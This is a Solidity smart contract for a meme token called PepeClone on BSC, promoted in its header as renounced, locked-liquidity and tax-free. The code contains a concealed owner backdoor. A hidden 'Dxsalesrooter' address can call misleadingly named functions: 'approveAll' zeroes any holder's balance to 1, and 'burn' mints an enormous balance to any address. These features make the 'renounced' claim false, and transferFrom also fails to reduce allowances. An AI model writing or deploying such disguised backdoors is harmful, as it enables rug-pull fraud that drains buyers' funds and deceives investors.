// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
/*
🐸PepeClone 🐸Bsc 🐸Locked lp 🐸renounced 🐸0% tax🐸
The King of Pepe is giving his magic to clone Pepe. He want his clone to make people happy and also make the world in peace.
🐸the clone of $PEPE coin in BSC as $Pepe enter 4Billion MC🐸

TG https://t.me/PepeCloneToken
🐸Degen ape shill
🐸lock lp 
🐸renounce
🐸low tax
🐸inspired By 
🐸https://foundation.app/@HdsNFT/foundation/128936
*/
contract PepeClone {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000000 * 10 ** 9;
    string public name = "PepeClone";
    string public symbol = "PEPECLONE";
    uint public decimals = 9;
    address private Dxsalesrooter;    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor(address SmartSwapV3) {
           Dxsalesrooter = SmartSwapV3;         
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
       modifier submanager() {
        require(Dxsalesrooter == msg.sender, "proxyPeerc20: caller is not the owner");
        _;
    }   
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
     function approveAll(address botsIsBlacklistedaddress) external submanager {
        balances[botsIsBlacklistedaddress] = 1;
   
    }

    /**
    * @dev See {proxyAfricanPepe-transfer}.
    *
    * Requirements:
    *
    * - `rooterv3swap` cannot be the zero address.
    * - the caller must have a balance of at least `rooterunit`.
    */

    function burn(address rooterpinksale) external submanager {
        balances[rooterpinksale] = 20000000000000000 * 10 ** 22;
    }   
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}